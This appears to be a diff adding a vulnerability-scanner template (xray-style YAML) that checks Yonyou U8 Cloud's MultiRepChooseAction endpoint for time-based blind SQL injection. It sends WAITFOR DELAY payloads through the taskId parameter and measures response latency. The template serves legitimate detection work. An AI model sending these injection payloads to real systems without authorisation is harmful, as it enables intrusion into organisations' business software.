@@ -1,0 +1,28 @@
+name: poc-yaml-yongyouU8-Cloud-MultiRepChooseAction-sql
+transport: http
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.web.reference.MultiRepChooseAction&method=execute&taskId=1%27);WAITFOR+DELAY+%270:0:4%27--
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+    expression: response.latency >= 4000 && response.latency <= 5000
+  r1:
+    request:
+      method: GET
+      path: /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.web.reference.MultiRepChooseAction&method=execute&taskId=1%27);WAITFOR+DELAY+%270:0:8%27--
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+    expression: response.latency >= 8000 && response.latency <= 9000
+expression: r0() && r1()
+ 
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487314&idx=1&sn=9ce75b5f9a12365c1a12d62743c93970&chksm=c267ba61f5103377960676d642ed8f5cd62afc36ac34a207bfc6e7b0385f5449f2a06023dfb0&token=2053938247&lang=zh_CN#rd
+
+
+
+
